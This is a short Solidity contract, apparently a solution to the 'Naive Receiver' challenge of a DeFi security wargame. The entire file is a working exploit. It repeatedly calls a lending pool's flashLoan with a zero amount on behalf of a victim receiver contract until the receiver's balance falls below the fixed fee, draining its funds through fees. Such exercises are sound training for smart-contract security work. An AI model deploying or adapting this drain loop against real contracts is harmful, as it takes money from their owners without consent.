// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

 interface InterfaceNaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker  {

    constructor() {}

    function attack(InterfaceNaiveReceiverLenderPool pool, address payable receiver) public {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }

}
